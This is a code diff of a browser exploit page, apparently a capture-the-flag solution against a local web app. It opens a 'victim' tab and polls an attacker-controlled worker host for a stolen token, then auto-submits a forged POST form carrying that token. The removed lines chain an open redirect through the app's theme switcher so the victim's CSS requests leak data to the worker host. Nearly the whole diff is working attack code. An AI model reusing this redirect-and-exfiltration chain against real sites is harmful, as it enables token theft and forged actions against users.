@@ -5,26 +5,19 @@
 const params = new URLSearchParams(location.search);
 const userId = params.get('uid');
 const worker = params.get('w');
-const sid = crypto.randomUUID();
+const sid = params.get('sid');
 
 function openVictim() {
-  const theme =
-    '../../../switch_theme?theme=light&redirect_path=//' +
-    new URL(worker).host +
-    '/css?id=' + encodeURIComponent(sid) + '%26x=';
-
-  const url =
-    'http://localhost:5000/switch_theme?theme=' +
-    encodeURIComponent(theme) +
-    '&redirect_path=/edit_user';
-
-  window.open(url, '_blank');
+  window.open('http://localhost:5000/edit_user', '_blank');
 }
 
 async function poll() {
   for (;;) {
-    const r = await fetch(worker + '/token?id=' + encodeURIComponent(sid), {cache:'no-store'});
+    const r = await fetch(worker + '/token?id=' + encodeURIComponent(sid), {
+      cache: 'no-store',
+    });
     const data = await r.json();
+
     if (data.token && data.token.length >= 91) {
       const f = document.createElement('form');
       f.method = 'POST';
@@ -45,11 +38,13 @@ async function poll() {
         i.value = v;
         f.appendChild(i);
       }
+
       document.body.appendChild(f);
       f.submit();
       return;
     }
-    await new Promise(r => setTimeout(r, 80));
+
+    await new Promise(r => setTimeout(r, 30));
   }
 }
 
